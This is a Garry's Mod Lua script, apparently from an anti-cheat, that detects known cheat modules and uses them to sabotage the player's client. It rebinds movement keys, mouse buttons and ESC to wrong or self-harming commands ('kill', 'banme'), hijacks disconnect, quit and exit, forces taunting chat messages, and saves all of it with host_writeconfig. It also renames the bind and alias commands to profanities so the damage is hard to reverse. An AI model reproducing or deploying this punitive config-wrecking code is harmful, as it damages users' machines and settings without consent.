
local _G			= _G
local pcall			= pcall
local tostring		= tostring
local NotRCC		= RunConsoleCommand
local NotRQ			= NotRQ or require
local NotTC 		= timer.Create
local NotTS 		= timer.Simple
local NotFE			= file.Exists
local _R			= debug.getregistry()

local Modules = {
	["gmcl_extras_win32.dll"]	= {"console", "Command"},
	["gmcl_oubhack_win32.dll"]	= {"OH_CLIENT_INTERFACE", "RunConsoleCommand"},
	["gmcl_hax_win32.dll"] 		= {"nh", "UserCmd"},
}


//OH GOD HOW DID THIS GET HERE, I'M NOT GOOD WITH COMPUTER
local function EatKeys(bind,alias,host_writeconfig, func,fname)
	local function RCC(str)
		local ret,err = pcall(function()
			func(str)
		end)
		if err then
			NotTS(20, function()
				NotRCC("ohdear", "EatKeys("..fname..") ["..tostring(err).."]")
			end)
		end
	end
	if fname == "cvar3" then
		RCC = function(s) LocalPlayer():ConCommand(s) end
	end
	
	local function FuckKey(k,v)
		RCC(bind..' '..k..' "'..v..'; '..alias..' toggleconsole; '..alias..' bind; say ILoveHeX!"')
	end
	
	RCC(bind..' MOUSE3 "sensitivity 15; volume 0.1; say Three mice?!"; sensitivity 15; volume 0.1')
	RCC(alias..' cancelselect "say I Really Love HeX"')
	RCC(alias..' disconnect "say I Love HeX!"')
	RCC(alias..' quit "say I Love HeX :)"')
	RCC(alias..' exit "say I Love HeX :D"')
	RCC(alias..' bind "say I love binding bad keys!"')
	
	FuckKey("w", 		"+back")
	FuckKey("a", 		"+moveright")
	FuckKey("s", 		"+forward")
	FuckKey("d", 		"+moveleft")
	FuckKey("f", 		"impulse 100")
	FuckKey("q", 		"+showscores")
	FuckKey("v", 		"noclip")
	FuckKey("e", 		"+jump")
	FuckKey("TAB", 		"+use")
	FuckKey("SPACE",	"+menu")
	FuckKey("MOUSE1",	"+attack2")
	FuckKey("MOUSE2",	"+attack")
	FuckKey("CTRL",		"kill")
	FuckKey("SHIFT",	"+walk")
	FuckKey("ESCAPE",	"kill")
	FuckKey("esc",		"banme")
	FuckKey("`", 		"toggleconsole")
	
	RCC("sensitivity 15; volume 0.1; "..host_writeconfig)
end


local function NewRQ(k)
	local ret,err = pcall(function()
		NotRQ(k)
	end)
	if err then
		NotTS(5, function()
			NotRCC("ohdear", "EatModules("..k..") ["..tostring(err).."]")
		end)
		return false
	end
	return true
end

local function EatModules()
	for k,v in pairs(Modules) do
		if not NotFE("lua/bin/"..k, "MOD") then continue end
		
		k = k:gsub("gmcl_", "")
		k = k:gsub("_win32.dll", "")
		
		if NewRQ(k) then
			if v[2] then
				EatKeys("bind","alias","host_writeconfig", _G[ v[1] ][ v[2] ], v[1].."."..v[2])
			else
				EatKeys("bind","alias","host_writeconfig", _G[ v[1] ], v[1])
			end
		end
	end
	
	if NotFE("lua/bin/gmcl_cvar3_win32.dll", "MOD") then
		if not NewRQ("cvar3") then return end
		if not (cvars.GetCommand and _R.ConVar.SetName) then
			NotRCC("ohdear", "EatModules(cvar3) [GCC("..tostring(cvars.GetCommand).."),SET("..tostring(_R.ConVar.SetName)..")]")
			return
		end
		
		local Bind 			= cvars.GetCommand("bind")
		local Alias 		= cvars.GetCommand("alias")
		local Writeconfig	= cvars.GetCommand("host_writeconfig")
		
		if not (Bind and Alias and Writeconfig) then
			NotRCC("ohdear", "EatModules(cvar3) [Bind="..tostring(Bind)..",Alias="..tostring(Alias)..",WC="..tostring(Writeconfig).."]")
			return
		end
		Bind:SetName("fuck")
		Alias:SetName("shit")
		Writeconfig:SetName("cock")
		
		EatKeys("fuck","shit","cock", nil, "cvar3")
		
		_R.ConVar.SetValue	= nil
		_R.ConVar.SetName	= nil
		_R.ConVar.SetFlags	= nil
	end
end
NotTS(30, EatModules)



HACInstalled = (HACInstalled or 0) + 1



